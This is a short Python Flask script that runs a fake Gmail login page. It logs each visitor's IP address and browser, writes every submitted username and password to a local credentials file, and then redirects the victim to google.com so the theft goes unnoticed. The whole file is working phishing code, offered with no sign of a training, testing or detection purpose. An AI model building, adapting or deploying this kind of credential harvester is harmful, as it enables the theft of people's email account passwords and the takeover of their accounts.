from flask import Flask, request, render_template, redirect
from datetime import datetime
import time
import os

app = Flask(__name__)

@app.route('/')
def login():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    with open('logs/visitors.log', 'a') as log:
        log.write(f"[Gmail] {datetime.now()} | IP: {ip} | UA: {ua}\n")
    return render_template('login_gmail.html')

@app.route('/login', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    with open('logs/credentials.txt', 'a') as cred:
        cred.write(f"[Gmail] {datetime.now()} | IP: {ip} | {username}:{password}\n")
    # bisa delay dulu, lalu redirect
    time.sleep(2)
    return redirect('https://www.google.com/')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5004)
